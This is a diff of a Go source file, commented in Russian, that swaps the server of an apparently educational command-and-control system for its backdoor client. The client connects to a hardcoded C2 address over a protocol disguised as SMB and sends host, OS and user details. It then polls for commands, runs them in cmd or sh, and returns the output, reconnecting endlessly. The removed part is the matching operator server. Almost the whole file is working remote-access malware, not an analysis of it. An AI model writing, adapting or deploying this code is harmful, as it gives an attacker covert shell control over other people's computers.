@@ -1,340 +1,218 @@
-// Package main реализует C2-сервер — промежуточный узел учебной
-// системы удалённого управления. Сервер одновременно обслуживает:
-//   - HTTP-эндпоинты для терминала оператора (приём команд и выдача статусов);
-//   - TCP-сервер на порту 445 для клиентов-бэкдоров (обмен в формате псевдо-SMB).
+// Package main реализует клиент-бэкдор учебной C2-системы.
+// Клиент подключается к C2-серверу по TCP (порт 445, псевдо-SMB),
+// регистрируется, циклически запрашивает задачи, выполняет команды
+// в командной оболочке и отправляет результаты обратно на C2.
 package main
 
 import (
-	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"log"
 	"net"
-	"net/http"
-	"sync"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
 	"time"
 
 	"c2project/shared"
 )
 
-// Client описывает зарегистрированного клиента-бэкдора.
-type Client struct {
-	ID       string    // Уникальный идентификатор клиента (hostname-OS-username)
-	Hostname string    // Имя хоста клиента
-	OS       string    // Название операционной системы клиента
-	LastSeen time.Time // Время последнего обращения клиента к C2
+// Адрес C2-сервера и порт для обмена задачами.
+const (
+	c2Address = "192.168.56.104:445"
+)
+
+// generateClientID формирует строку с информацией о клиенте
+// (hostname, OS, username), разделённую символом '|'.
+// Может использоваться для отладки.
+func generateClientID() string {
+	hostname, _ := os.Hostname()
+	osName := runtime.GOOS
+	user := os.Getenv("USERNAME")
+	if user == "" {
+		user = os.Getenv("USER")
+	}
+	raw := fmt.Sprintf("%s|%s|%s", hostname, osName, user)
+	return raw
 }
 
-// Task описывает задачу — команду, отправленную оператором,
-// и результат её выполнения на клиенте.
-type Task struct {
-	ID       string // Уникальный идентификатор задачи
-	ClientID string // Идентификатор клиента, которому предназначена задача
-	Command  []byte // Зашифрованная команда (ключ KeyC2ToClient)
-	Result   []byte // Зашифрованный результат выполнения
-	Status   string // Статус: pending (в очереди) или done (выполнено)
+// buildRegistration формирует строку регистрации для отправки на C2
+// в формате "id|hostname|os", где id = "hostname-OS-username".
+// Возвращает готовую к шифрованию и отправке строку.
+func buildRegistration() string {
+	hostname, _ := os.Hostname()
+	osName := runtime.GOOS
+	user := os.Getenv("USERNAME")
+	if user == "" {
+		user = os.Getenv("USER")
+	}
+	id := fmt.Sprintf("%s-%s-%s", hostname, osName, user)
+	return fmt.Sprintf("%s|%s|%s", id, hostname, osName)
 }
 
-// Store — потокобезопасное in-memory хранилище данных C2-сервера.
-// Базы данных не используются, всё хранится в оперативной памяти процесса.
-type Store struct {
-	mu      sync.Mutex          // Мьютекс для защиты одновременного доступа
-	clients map[string]*Client  // Реестр клиентов: ID -> Client
-	tasks   map[string]*Task    // Все задачи: TaskID -> Task
-	queues  map[string][]string // Очереди задач по клиентам: ClientID -> [TaskID]
+// sendPacket сериализует и отправляет пакет псевдо-SMB на C2.
+// Параметры:
+//   - conn — активное TCP-соединение;
+//   - cmd — код команды (CmdRegister, CmdGetTask, CmdSendResult и т.д.);
+//   - payload — зашифрованная полезная нагрузка.
+// Возвращает ошибку при сбое записи в соединение.
+func sendPacket(conn net.Conn, cmd uint16, payload []byte) error {
+	pkt := &shared.Packet{
+		Command:   cmd,
+		SessionID: 0,
+		MessageID: uint64(time.Now().UnixNano()),
+		Payload:   payload,
+	}
+	_, err := conn.Write(pkt.Serialize())
+	return err
 }
 
-// NewStore создаёт и инициализирует новое хранилище Store.
-// Возвращает указатель на готовый к использованию Store.
-func NewStore() *Store {
-	return &Store{
-		clients: make(map[string]*Client),
-		tasks:   make(map[string]*Task),
-		queues:  make(map[string][]string),
-	}
+// cp866Table — таблица соответствия байтов CP866 (DOS) и Unicode-символов.
+// Используется для корректной конвертации русских букв из вывода cmd.exe.
+var cp866Table = map[byte]rune{
+	0x80: 'А', 0x81: 'Б', 0x82: 'В', 0x83: 'Г', 0x84: 'Д', 0x85: 'Е', 0x86: 'Ж', 0x87: 'З',
+	0x88: 'И', 0x89: 'Й', 0x8A: 'К', 0x8B: 'Л', 0x8C: 'М', 0x8D: 'Н', 0x8E: 'О', 0x8F: 'П',
+	0x90: 'Р', 0x91: 'С', 0x92: 'Т', 0x93: 'У', 0x94: 'Ф', 0x95: 'Х', 0x96: 'Ц', 0x97: 'Ч',
+	0x98: 'Ш', 0x99: 'Щ', 0x9A: 'Ъ', 0x9B: 'Ы', 0x9C: 'Ь', 0x9D: 'Э', 0x9E: 'Ю', 0x9F: 'Я',
+	0xA0: 'а', 0xA1: 'б', 0xA2: 'в', 0xA3: 'г', 0xA4: 'д', 0xA5: 'е', 0xA6: 'ж', 0xA7: 'з',
+	0xA8: 'и', 0xA9: 'й', 0xAA: 'к', 0xAB: 'л', 0xAC: 'м', 0xAD: 'н', 0xAE: 'о', 0xAF: 'п',
+	0xB0: '░', 0xB1: '▒', 0xB2: '▓', 0xB3: '│', 0xB4: '┤', 0xB5: '╡', 0xB6: '╢', 0xB7: '╖',
+	0xB8: '╕', 0xB9: '╣', 0xBA: '║', 0xBB: '╗', 0xBC: '╝', 0xBD: '╜', 0xBE: '╛', 0xBF: '┐',
+	0xC0: '└', 0xC1: '┴', 0xC2: '┬', 0xC3: '├', 0xC4: '─', 0xC5: '┼', 0xC6: '╞', 0xC7: '╟',
+	0xC8: '╚', 0xC9: '╔', 0xCA: '╩', 0xCB: '╦', 0xCC: '╠', 0xCD: '═', 0xCE: '╬', 0xCF: '╧',
+	0xD0: '╨', 0xD1: '╤', 0xD2: '╥', 0xD3: '╙', 0xD4: '╘', 0xD5: '╒', 0xD6: '╓', 0xD7: '╫',
+	0xD8: '╪', 0xD9: '┘', 0xDA: '┌', 0xDB: '█', 0xDC: '▄', 0xDD: '▌', 0xDE: '▐', 0xDF: '▀',
+	0xE0: 'р', 0xE1: 'с', 0xE2: 'т', 0xE3: 'у', 0xE4: 'ф', 0xE5: 'х', 0xE6: 'ц', 0xE7: 'ч',
+	0xE8: 'ш', 0xE9: 'щ', 0xEA: 'ъ', 0xEB: 'ы', 0xEC: 'ь', 0xED: 'э', 0xEE: 'ю', 0xEF: 'я',
+	0xF0: 'Ё', 0xF1: 'ё', 0xF2: 'Є', 0xF3: 'є', 0xF4: 'Ї', 0xF5: 'ї', 0xF6: 'Ў', 0xF7: 'ў',
+	0xF8: '°', 0xF9: '∙', 0xFA: '·', 0xFB: '√', 0xFC: '№', 0xFD: '¤', 0xFE: '■', 0xFF: '\u00A0',
 }
 
-// Глобальный экземпляр хранилища, используемый всеми обработчиками.
-var store = NewStore()
-
-// handleSubmit обрабатывает HTTP-запрос от терминала на постановку задачи.
-// Ожидает POST с JSON {"client_id": ..., "command": base64(enc)}.
-// Логика:
-//  1. Проверяет, что клиент с указанным ID зарегистрирован.
-//  2. Декодирует base64 и расшифровывает команду первым ключом (KeyTerminalToC2).
-//  3. Перешифровывает команду вторым ключом (KeyC2ToClient).
-//  4. Создаёт задачу, кладёт её в tasks и добавляет ID в очередь клиента.
-//  5. Возвращает JSON {"task_id": ...}.
-func handleSubmit(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
-	var raw map[string]string
-	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
-		http.Error(w, "bad request", http.StatusBadRequest)
-		return
-	}
-	clientID := raw["client_id"]
-	encB64 := raw["command"]
-
-	store.mu.Lock()
-	if _, ok := store.clients[clientID]; !ok {
-		store.mu.Unlock()
-		http.Error(w, "unknown client", http.StatusNotFound)
-		return
-	}
-
-	encCommand, err := base64.StdEncoding.DecodeString(encB64)
-	if err != nil {
-		store.mu.Unlock()
-		http.Error(w, "bad base64", http.StatusBadRequest)
-		return
-	}
-	plainCommand, err := shared.Decrypt(shared.KeyTerminalToC2, encCommand)
-	if err != nil {
-		store.mu.Unlock()
-		http.Error(w, "decrypt failed", http.StatusBadRequest)
-		return
-	}
-	reencCommand, err := shared.Encrypt(shared.KeyC2ToClient, plainCommand)
-	if err != nil {
-		store.mu.Unlock()
-		http.Error(w, "encrypt failed", http.StatusInternalServerError)
-		return
-	}
-
-	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
-	task := &Task{
-		ID:       taskID,
-		ClientID: clientID,
-		Command:  reencCommand,
-		Status:   shared.StatusPending,
-	}
-	store.tasks[taskID] = task
-	store.queues[clientID] = append(store.queues[clientID], taskID)
-	store.mu.Unlock()
-
-	log.Printf("[C2] Задача %s для клиента %s: %s", taskID, clientID, string(plainCommand))
-
-	resp := shared.SubmitResponse{TaskID: taskID}
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(resp)
-}
-
-// handleStatus обрабатывает GET-запрос терминала о статусе задачи.
-// Ожидает query-параметр id с идентификатором задачи.
-// Если задача выполнена, возвращает результат, перешифрованный
-// первым ключом (KeyTerminalToC2) и закодированный в base64.
-func handleStatus(w http.ResponseWriter, r *http.Request) {
-	taskID := r.URL.Query().Get("id")
-	if taskID == "" {
-		http.Error(w, "missing id", http.StatusBadRequest)
-		return
-	}
-	store.mu.Lock()
-	task, ok := store.tasks[taskID]
-	store.mu.Unlock()
-	if !ok {
-		http.Error(w, "task not found", http.StatusNotFound)
-		return
-	}
-
-	resp := shared.StatusResponse{
-		TaskID: task.ID,
-		Status: task.Status,
-	}
-	if task.Status == shared.StatusDone && len(task.Result) > 0 {
-		plain, err := shared.Decrypt(shared.KeyC2ToClient, task.Result)
-		if err == nil {
-			reenc, err2 := shared.Encrypt(shared.KeyTerminalToC2, plain)
-			if err2 == nil {
-				resp.Result = base64.StdEncoding.EncodeToString(reenc)
-			}
+// cp866ToUTF8 конвертирует строку из кодировки CP866 в UTF-8.
+// Байты < 0x80 остаются без изменений (ASCII), байты >= 0x80
+// заменяются на соответствующие Unicode-символы из cp866Table.
+func cp866ToUTF8(s string) string {
+	var b strings.Builder
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if c < 0x80 {
+			b.WriteByte(c)
+		} else if r, ok := cp866Table[c]; ok {
+			b.WriteRune(r)
+		} else {
+			b.WriteByte(c)
 		}
 	}
-
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(resp)
+	return b.String()
 }
 
-// handleClients обрабатывает GET-запрос терминала на получение
-// списка зарегистрированных клиентов. Возвращает JSON-массив ClientInfo.
-func handleClients(w http.ResponseWriter, r *http.Request) {
-	store.mu.Lock()
-	list := make([]shared.ClientInfo, 0, len(store.clients))
-	for _, c := range store.clients {
-		list = append(list, shared.ClientInfo{
-			ClientID: c.ID,
-			Hostname: c.Hostname,
-			OS:       c.OS,
-			LastSeen: c.LastSeen.Format(time.RFC3339),
-		})
+// executeCommand выполняет переданную команду в командной оболочке
+// целевой ОС и возвращает объединённый вывод STDOUT и STDERR.
+// На Windows вывод предварительно переводится в кодировку CP866,
+// затем конвертируется в UTF-8 для корректной передачи через C2.
+// В случае ошибки выполнения к результату добавляется текст ошибки.
+func executeCommand(cmd string) string {
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		fullCmd := "chcp 866>nul && " + cmd
+		out, err = exec.Command("cmd", "/C", fullCmd).CombinedOutput()
+	} else {
+		out, err = exec.Command("sh", "-c", cmd).CombinedOutput()
 	}
-	store.mu.Unlock()
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(list)
+	result := cp866ToUTF8(string(out))
+	if err != nil {
+		result += "\n[error] " + err.Error()
+	}
+	return result
 }
 
-// handleClient обслуживает одно TCP-соединение от клиента-бэкдора.
-// Параметр conn — активное TCP-соединение.
-// Логика:
-//  1. Читает пакет регистрации, расшифровывает данные (hostname, OS).
-//  2. Регистрирует клиента в store, отправляет подтверждение CmdRegisterAck.
-//  3. В цикле принимает пакеты:
-//     - CmdGetTask — выдаёт следующую задачу из очереди (или пустой пакет);
-//     - CmdSendResult — сохраняет результат, помечает задачу как done,
-//       отправляет подтверждение CmdResultAck.
-// При разрыве соединения завершает горутину.
-func handleClient(conn net.Conn) {
+// run устанавливает соединение с C2-сервером, регистрируется,
+// затем в цикле запрашивает задачи, выполняет их и отправляет результаты.
+// При любой ошибке соединения функция завершается, а main выполняет
+// повторное подключение через заданный интервал.
+func run() {
+	log.Printf("[CLIENT] Подключение к C2 %s", c2Address)
+	conn, err := net.Dial("tcp", c2Address)
+	if err != nil {
+		log.Printf("[CLIENT] Ошибка подключения: %v", err)
+		return
+	}
 	defer conn.Close()
-	log.Printf("[C2] Новое TCP-соединение от %s", conn.RemoteAddr())
 
-	pkt, err := shared.ReadPacket(conn)
+	regData := buildRegistration()
+	encReg, err := shared.Encrypt(shared.KeyC2ToClient, []byte(regData))
 	if err != nil {
-		log.Printf("[C2] Ошибка чтения: %v", err)
+		log.Printf("[CLIENT] Ошибка шифрования регистрации: %v", err)
 		return
 	}
 
-	if pkt.Command != shared.CmdRegister {
-		log.Printf("[C2] Неизвестная команда регистрации: %x", pkt.Command)
+	if err := sendPacket(conn, shared.CmdRegister, encReg); err != nil {
+		log.Printf("[CLIENT] Ошибка отправки регистрации: %v", err)
 		return
 	}
 
-	regData, err := shared.Decrypt(shared.KeyC2ToClient, pkt.Payload)
-	if err != nil {
-		log.Printf("[C2] Ошибка расшифровки регистрации: %v", err)
+	ack, err := shared.ReadPacket(conn)
+	if err != nil || ack.Command != shared.CmdRegisterAck {
+		log.Printf("[CLIENT] Регистрация не подтверждена")
 		return
 	}
-	parts := splitRegistration(string(regData))
-	if len(parts) < 1 {
-		log.Printf("[C2] Некорректные данные регистрации")
-		return
-	}
-	clientID := parts[0]
-
-	store.mu.Lock()
-	client, ok := store.clients[clientID]
-	if !ok {
-		client = &Client{ID: clientID}
-		store.clients[clientID] = client
-	}
-	if len(parts) > 1 {
-		client.Hostname = parts[1]
-	}
-	if len(parts) > 2 {
-		client.OS = parts[2]
-	}
-	client.LastSeen = time.Now()
-	store.mu.Unlock()
-
-	log.Printf("[C2] Клиент зарегистрирован: ID=%s Host=%s OS=%s", clientID, client.Hostname, client.OS)
-
-	ack := &shared.Packet{
-		Command:   shared.CmdRegisterAck,
-		SessionID: pkt.SessionID,
-		MessageID: pkt.MessageID,
-	}
-	conn.Write(ack.Serialize())
+	log.Printf("[CLIENT] Зарегистрирован на C2")
 
 	for {
-		pkt, err := shared.ReadPacket(conn)
-		if err != nil {
-			log.Printf("[C2] Клиент %s отключился: %v", clientID, err)
+		time.Sleep(3 * time.Second)
+
+		if err := sendPacket(conn, shared.CmdGetTask, nil); err != nil {
+			log.Printf("[CLIENT] Ошибка запроса задачи: %v", err)
 			return
 		}
 
-		switch pkt.Command {
-		case shared.CmdGetTask:
-			store.mu.Lock()
-			queue := store.queues[clientID]
-			var task *Task
-			if len(queue) > 0 {
-				taskID := queue[0]
-				store.queues[clientID] = queue[1:]
-				task = store.tasks[taskID]
-			}
-			store.mu.Unlock()
-
-			resp := &shared.Packet{
-				Command:   shared.CmdTaskData,
-				MessageID: pkt.MessageID,
-			}
-			if task != nil {
-				resp.Payload = task.Command
-				resp.TreeID = 1
-				log.Printf("[C2] Отправлена задача %s клиенту %s", task.ID, clientID)
-			}
-			conn.Write(resp.Serialize())
-
-		case shared.CmdSendResult:
-			store.mu.Lock()
-			for _, task := range store.tasks {
-				if task.ClientID == clientID && task.Status == shared.StatusPending {
-					task.Result = pkt.Payload
-					task.Status = shared.StatusDone
-					log.Printf("[C2] Получен результат для задачи %s", task.ID)
-					break
-				}
-			}
-			store.mu.Unlock()
-
-			ack := &shared.Packet{
-				Command:   shared.CmdResultAck,
-				MessageID: pkt.MessageID,
-			}
-			conn.Write(ack.Serialize())
-		}
-	}
-}
-
-// splitRegistration разбивает строку вида "id|hostname|os" на части
-// по символу-разделителю '|'. Возвращает срез строк.
-func splitRegistration(s string) []string {
-	var parts []string
-	cur := ""
-	for _, ch := range s {
-		if ch == '|' {
-			parts = append(parts, cur)
-			cur = ""
-		} else {
-			cur += string(ch)
-		}
-	}
-	if cur != "" {
-		parts = append(parts, cur)
-	}
-	return parts
-}
-
-// main — точка входа C2-сервера.
-// Запускает в горутине HTTP-сервер на порту 8080 для терминала оператора,
-// а в основном потоке — TCP-сервер на порту 445 для клиентов-бэкдоров.
-// Каждое входящее TCP-соединение обрабатывается в отдельной горутине.
-func main() {
-	http.HandleFunc(shared.EndpointSubmit, handleSubmit)
-	http.HandleFunc(shared.EndpointStatus, handleStatus)
-	http.HandleFunc(shared.EndpointList, handleClients)
-
-	go func() {
-		log.Println("[C2] HTTP-сервер запущен на :8080")
-		if err := http.ListenAndServe(":8080", nil); err != nil {
-			log.Fatal(err)
-		}
-	}()
-
-	listener, err := net.Listen("tcp", ":445")
-	if err != nil {
-		log.Fatalf("[C2] Не удалось занять порт 445: %v", err)
-	}
-	log.Println("[C2] TCP-сервер (псевдо-SMB) запущен на :445")
-
-	for {
-		conn, err := listener.Accept()
+		resp, err := shared.ReadPacket(conn)
 		if err != nil {
-			log.Printf("[C2] Ошибка accept: %v", err)
+			log.Printf("[CLIENT] Ошибка чтения задачи: %v", err)
+			return
+		}
+
+		if resp.Command != shared.CmdTaskData {
 			continue
 		}
-		go handleClient(conn)
+
+		if len(resp.Payload) == 0 {
+			continue
+		}
+
+		plainCmd, err := shared.Decrypt(shared.KeyC2ToClient, resp.Payload)
+		if err != nil {
+			log.Printf("[CLIENT] Ошибка расшифровки команды: %v", err)
+			continue
+		}
+		cmdStr := strings.TrimSpace(string(plainCmd))
+		log.Printf("[CLIENT] Получена команда: %s", cmdStr)
+
+		output := executeCommand(cmdStr)
+		log.Printf("[CLIENT] Результат: %s", output)
+
+		encResult, err := shared.Encrypt(shared.KeyC2ToClient, []byte(output))
+		if err != nil {
+			log.Printf("[CLIENT] Ошибка шифрования результата: %v", err)
+			continue
+		}
+
+		if err := sendPacket(conn, shared.CmdSendResult, encResult); err != nil {
+			log.Printf("[CLIENT] Ошибка отправки результата: %v", err)
+			return
+		}
+
+		_, _ = shared.ReadPacket(conn)
+	}
+}
+
+// main запускает бесконечный цикл: подключение к C2, работа,
+// затем ожидание 10 секунд и повторное подключение при разрыве.
+func main() {
+	for {
+		run()
+		log.Printf("[CLIENT] Переподключение через 10 секунд")
+		time.Sleep(10 * time.Second)
 	}
 }
